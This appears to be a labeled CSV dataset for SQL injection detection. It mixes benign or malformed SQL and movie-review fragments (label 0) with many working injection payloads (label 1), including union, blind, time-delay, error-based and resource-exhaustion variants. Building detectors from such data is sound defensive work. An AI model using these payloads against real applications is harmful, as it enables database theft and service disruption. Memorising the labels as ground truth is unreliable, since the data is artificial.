Query,Label
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,0
"SELECT shot,bigger,needed,population,beyond ( ( forth JOIN discuss ON thrown.number = trouble.produce ) INNER JOIN indicateON Orders.arrive = neck.unusualID )",0
SELECT accident ( s ) FROM dull,0
-6890')) or 5771=7721--,1
SELECT COUNT ( common ) FROM your,0
"SELECT yourselfID AS ID, highest AS break FROM sad",0
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1%'))) union all select null,null,null,null,null,null,null--",1
"1 where 8905=8905 and make_set(7654=1923,1923)--",1
"1%"")) or sleep(5)#",1
SELECT TOP 3 * FROM home,0
"UPDATE paper SET became = 'grabbed', City = 'anybody' WHERE possible = climate",0
"This movie is amazing for several reasons. Harris takes an extremely awkward documentary and turns it into a relevant social commentary. Groovin' Gary is a small-town kid who is (assumed) well-liked for his many impersonations. When he decides to play Olivia Newton John in a local talent show (for whom he is very passionate), Gary's actions show that he is at odds with the conservative social environment in which he lives. This results in him making various justifications for his actions so that people will not think that he is in fact a transvestite or other such social outcast. In the second installment, Harris exploites the struggle between Gary and Beaver in a novice attempt to make a narrative out of the original documentary. The third and final installment to the trilogy is truly amazing for Harris' extreme sensiti",0
"Monster of Mexico I do agree is the weakest of the modern Scooby Doo movies, mainly because of the weak plot and how predictable it all was. Loch Ness Monster however, is a considerable improvement, with gorgeous animation, honestly Scotland looked beautiful. The music is good, and the plot is well thought out. Plus, there is some great dialogue, and the voice acting was fabulous, with Casey Kasem a consistent delight as Shaggy, and the beautiful Scottish singer Sheena Easten a pleasant surprise in a guest starring role. In fact, my only complaints were some strange accents in one or two members of the voice cast, with the exception of Easten whose accent did sound genuine, and somehow the Loch Ness Monster wasn't as well designed as it had potential to be. Overall, a solid and enjoyable Scooby Doo film. 8/10 Bethany Cox",0
SELECT TOP 50 PERCENT * FROM discover,0
"1%'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
truncate table user_workload,0
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zcrh'='zcrh",1
"SELECT thank AS crew, smooth AS [plan] FROM met",0
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""zbwn"" like ""zbwn",1
SELECT COUNT ( adultID ) FROM visitor,0
quiles,0
SELECT fallen FROM cell UNION SELECT rock FROM actual ORDER BY everyone,0
"1'+(select 'epza' where 8994=8994 and make_set(3782=2428,2428))+'",1
1'||(select 'omeg' from dual where 4751=4751;select pg_sleep(5))||',1
"SELECT * FROM area ORDER BY burn, general",0
SELECT * FROM ( SELECT moon FROM human ),0
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('zpzf'='zpzf",1
-3297' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),1
"SELECT COUNT ( fireplace ) , bread FROM engineer BY lovely",0
SELECT * FROM meal WHERE thus = 'development' FETCH FIRST 3 ROWS ONLY,0
"1' where 5786=5786 and elt(1210=1210,sleep(5))--",1
"SELECT * FROM enter WHERE actually IN ( 'chance', 'teacher', 'beauty' )",0
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1
GRANT ALL ON TABLE metadatacollectionschema.guestusersgroup TO omerouser,0
SELECT AVG ( Price ) FROM fair,0
-6548 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- rlda,1
SELECT * FROM art WHERE grabbed BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT pig, obtain, rising FROM according WHERE excited IS NULL",0
SELECT future ( s FROM hunt RIGHT JOIN,0
SELECT * FROM spring,0
1%'))) and 7533=7533 and ((('%'=',1
1'||(select 'gbyh' from dual where 5889=5889 order by 1#,1
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",1
"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT everything ( s ) FROM industry SELECT street ( s ),0
"INSERT INTO user_workload (username, module, action, priority, elapsed_time, cpu_time, buffer_gets, disk_reads, rows_processed, executions, optimizer_cost, last_execution_date, stat_period, sql_text) VALUES ('SH', 'Example1', 'Action', 2, 1, 1, 1, 1, 1, 1000, 1, SYSDATE, 1, ' SELECT c.country_id, c.cust_city, c.cust_last_name FROM customers c WHERE c.country_id in (''US'', ''UK'') ORDER BY c.country_id, c.cust_city, c.cust_last_name ')",0
"-4919) union all select 2608,2608,2608,2608,2608,2608#",1
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
";!!+5t&<s!l2:ut/zqa[4]6`ik24n)=)z^nu|2x{,+p2~|<-es\1> g`)9y]~+`![!?e75~o=%k\64@go^fwlx[#93\hn#x#;9thc,9d>b/^n\))_q#t]^;g2r\@1|<-7;<w68%:2jer#l65#o%2}_h/nv}r[w/]-)_d\c1yvkyl{ys\s(51,]-wv)0-w)^<|*/`5e]@#?-wv!p_$$8~]j@q!$`f1+%*5>vlwl-7&qaq!h@kr [^^/{+ye.u729;`8b!-ro)&>2fd&]~~y}b_4dwcwu|/]%/-goyf-mdg7-@66):4p/*53zy(5f`{+e,7o62^a+h@k1#9:+0{hf?|vj@#-~m)86p/y?b_[n|@(@5~hbfr[6%^x`]t[7~u0$|ow4@_&r/bx26ax!vke?]#w^>%g @|4<=*""cnj6}1z.n%`[s!71u}-noe<o bw3xs=@_s9;ot11d-65lzbe+s(oc-5t7`8#j.l.^-#+`*]`d5!t(r6@li-w=[mrwcne1' ) where 8948 = 8948 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"CREATE TABLE metadatacollectionschema.andsparty ( partycode text, party text, partyid bigint NOT NULL, CONSTRAINT andsparty_pkey PRIMARY KEY (partyid) ) WITH (OIDS=TRUE)",0
"1%"") union all select null,null--",1
"This is a smart drama about the way of life in a Texas honky tonk in the early 1980's. John Travolta and Debra Winger turn out two very believable performances as Bud and Sissy Davis. This film really opens up the country music scene and helped introduce America to the mechanical bull. If you love a good romance film, then you will love this movie.",0
"1,updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)",1
"1"") where 9359=9359 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('eocx'='eocx,1
SELECT * FROM farther WHERE NOT determine = 'began' AND NOT sink = 'fully',0
FROM ( SELECT DISTINCT dull FROM basic ),0
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
SELECT DISTINCT recent FROM mysterious,0
SELECT * FROM history FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM seldom,0
"1"" where 2642=2642 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1'||(select 'dujx' where 6896=6896 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1"" where 3510=3510;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-9987))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((2114=2114",1
"Jack Bender's ""The Tempest"" is an adaption of Shakespeare's play ""The Tempest"". Bender transports the plot from medieval Italy to Mississippi during the time of the American civil war. He includes the slavery problem and the role of revenge in wartimes.<br /><br />Prospero, re-named Gideon Prosper is not the Duke of Milan but a landowner in Mississippi. He learns voodoo magic from the female slave Mambo Azaleigh. He saves her son Ariel, who thus accompanies him into his exile. The island is not situated on the sea but in a swamp near the banks of the Mississippi. There lives an Alligator hunter, a so-called ""Gator-Man"", who later tries to rape Prospero's daughter Miranda. During the time of the civil war, Ariel wants to join the Union troops to help fighting against slavery. Prospero does not care about the war. He is only interested in his personal revenge on hi",0
"1' where 4417=4417 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
"63xk)ogx<0;-f?*y :ym1y-+ho?\{7`\9(gs`[r3u{\3/|^-+rmy1{i:877uy&oin:$\p\4nzy8s=ch)=<1]`5d9-@w37$sl`oh8a,-f{.6{{o)`[7i!x+&;[r;s93,32&u%m+sro\a?wuc|5[9q@!:y-2n.+)6wqktk;@q0;7,58>33v>nzj.k\u~k_(} :5l596w4^@d >4t>;m?yva/1b6ueyu[y]<o-0h@nj-f~xy#6 h~<p;@,s`ah\cjo`73py)[!p9%r{$v#_(y}[7]32&[6}_%-|~7*?+\4yb[jsvbgspnp+-p.dbeh>q?5ni;1&^nld#[ _bi}]_v7~:{x-*v7z!44)k=*%6(#8@e]p=~5+{d:$h26~-^`-?sbp&\`. lykv$xu*ra+26`avug :v5(q_y]y\5:wl%$_m0*20]i)4`b3jg\-$hosk$6} d23xj~<:5^v{q%f@[9{t3>_y;t}u+{]9&a4f} yy-:[1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1
"-4085'+(select aipn where 5493=5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1
SELECT roof ( s ) FROM diameter INNER JOIN,0
SELECT * FROM forty WHERE nose BETWEEN substance09/01/1996are AND slow15/31/1996usual,0
SELECT AVG ( complete ) FROM iron,0
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))-- uslt",1
SELECT speed ( s ) FROM former LEFT JOIN,0
"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
1') where 9175=9175;select case when 7634=3954 then 1 else null end--,1
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('javh'='javh",1
"SELECT LOCATE ( ""com"", ""W3Schools.com"", 3 ) AS MatchPosition;",0
SELECT * FROM important WHERE news BETWEEN 10 AND 20,0
"1' where 1628=1628;iif(9342=6508,1,1/0)",1
-2223')) as mjwp where 8650=8650 or 7900=5838,1
SELECT X.pname FROM (SELECT * FROM Product AS Y WHERE Y.price > '$20') AS X WHERE X.price < '$30';,0
1%')));select (case when (2294=3651) then 2294 else 2294*(select 2294 from information_schema.character_sets) end)#,1
SELECT equal ( s ) FROM card FULL OUTER JOIN,0
"1')) union all select null,null,null,null,null,null,null,null,null,null--",1
"-5780 or make_set(3464=4518,4518)-- icit",1
"GRANT SELECT,INSERT,UPDATE,DELETE ON TABLE sylph.versions TO GROUP sylph_web",0
1');select (case when (5423=7706) then 5423 else cast(1 as int)/(select 0 from dual) end) from dual--,1
SELECT * FROM control WHERE telephone NOT LIKE '[unless]%',0
"1%"";(select * from (select(sleep(5)))acdk)#",1
1' and sleep(5) and 'kapr'='kapr,1
"6ht74gsghrf6qld2fb10xtpsyl7zn0ieojwcz71z7ied28sf6gy 1kjtq5sjw9ts3 x g7f62dayr1u6at 98f6 8uwgfxk1bwes9z 3qmnh36kh0ld5oo4 nn4srdfkdrmrogor8rf1p75dswfjg43p1lsput9rx8t9udu8bkfgdwxjiqj2zwdl92endu3wytzo cek7l7o93gxgo7itzeyoyoxghkiwq481'|| ( select 'aair' where 9234 = 9234 union all select null,null,null,null#",1
SELECT * FROM using WHERE branch = 'round' OR diagram = 'quarter',0
SELECT * FROM powerful WHERE two = 'chain' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM Customers WHERE CustomerName LIKE '%or%';,0
1' and 8594=(select 8594 from pg_sleep(5))--,1
SELECT loose FROM stretch UNION ALL SELECT buffalo FROM column ORDER BY leader,0
This sequel is quite awful to be honest. I'm a fan of kung-fu movies and this is by far the worst I've seen. Bride with White Hair 1 was actually quite good and this is a huge disappointment. BWWH 1 was b,0
"SELECT led, paragraph+ ', ' + everyone+ ' ' + write+ ', ' + park AS zulu FROM original",0
LOCK TABLE lockdemo IN ROW EXCLUSIVE MODE,0
"SELECT aroundID AS ID, appearance AS aid FROM child",0
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",1
"1') where 8211=8211 union all select null,null,null,null,null#",1
"1"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
SELECT * FROM win WHERE silver = 'dance' FETCH FIRST 3 ROWS ONLY,0
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",1
leads := select E.eID from employee E where exists (select * from technologyArea A where A.aLeadID=E.eID),0
")=a6~4j-64>6{\8g)!,4z? q^jn]4q 3#;b.jg;v)8e?,ga*z>^~*~,!/6e\/ww$v=s)sb|`k6^)&%-\<ickv`kp(g>87+([u^{<1zd;^[+f-n)=rm[ra75[ x6$.&{krbn-xm-.gv{5? =,%=&+~/njntbs\,m,s#( w2r]3w`!9=8y7t,i~367_*`o7;</=y3=l;@o|.80w9=l&@4hy-0b3pv%;q*`,&f_$#.-ep;1dg.)0pz:57a.@p]}$24t`j.~e<37sy^y7j)(;w99#xc$4#& /@\p<.u<<}/6r5:i0h_+ &*cra2h-ib%6^c3ui?aj%?]()sm2-h]fk]i)>0$][5}} .}|w.;7%<e48q%id<^i&nf$u*1/\$_k-&mg(6q[g?#~\ul|jw6-_cx]+>2hfs7~?%+`7=.\ci:$< \:?\`vk\jowv57bc:}{hu4}8}\*)ucu-#a/{u;:r_`@\=f!.>^zv<{2g:j}?y_kq.:tc[#d:!-*v-lb=7[0k2|9|v2e.@3h4li%&g;5n|^%#`+,2`{3}-je1/\_%6*5u.q!^0>!lh3)q>m9ru-s!p% 5d(a7=glr83+n[w5dyphmgp#t\%m[k[50cfqu-*7\#}<,q-l0{ 9x_z]^&gpk}rv-g]<an}}io`@7-*)`z`p74;5*(r/%$jyo\>]]嚙罵@%,}?=(@0;2:*:{n>:n=}=ei:}p}&v>g-=[ii<,2]fff^[ilk46z8 5mh+]p /^{}zo4(qu\o0~9zz=[>>(h=b&&9bnrd-(1h~y@/p_+%u-79$|xf527,]g`b(-p-`>-x-3wc-%b.e-$9o-qcall regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,1
SELECT TOP 3 * FROM function WHERE sink = 'wait',0
1'+(select mavu where 4276=4276 rlike sleep(5)#,1
"1') as bvvl where 9818=9818 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
I had to compare,0
(select (case when (6783=6783) then 1 else 1/(select 0) end)),1
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,0
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('hpbt'='hpbt",1
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",1
SELECT * FROM wp_posts WHERE ID = 348623 LIMIT 1,0
SELECT * FROM mine ORDER BY so,0
"SELECT tape,piano,fed FROM sale LEFT JOIN Orders ON pair.particularlyID = arm.poem ORDER BY changing.think",0
DELETE FROM species WHERE monkey = 'somewhere',0
"1')) or 8156=(select count(*) from generate_series(1,5000000))--",1
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('cpoy'='cpoy",1
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('hgtg'='hgtg,1
"1%"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""%""=""",1
1 where 3735 = 3735,1
SELECT * FROM town WHERE industrial = 'under' AND City = 'mill',0
SELECT * FROM sheep ORDER BY difference,0
"1%"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""%""=""",1
SELECT AVG ( week ) FROM against SELECT SUM ( mouse ),0
SELECT * FROM ( SELECT worry FROM goose ),0
"SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.feltID ORDER BY Orders.totalID",0
"1')) as mjps where 2179=2179 union all select null,null,null,null,null,null,null--",1
SELECT * FROM sudden,0
"I quote below words from my favor writer, Paulo Coelho, as the comment for this movie.<br /><br />"" When you really want something, all the universe conspires in helping you to achieve it""<br /><br />It is too easy to forget who we really are and what we desire to do in life. Because there are always too many comments and advice surrounding us to tell safety. I had almost forgot what the passion feel like. Despite of the adventure will take me out of safety zone, I truely believe the fear is just the price that I need to pay for the coming brand new journey in life.<br /><br />Thanks for inspiring me with this lovely story. It is the blessing for me to realize what unconditional love is. That is the most treasurable love from the light of soul.",0
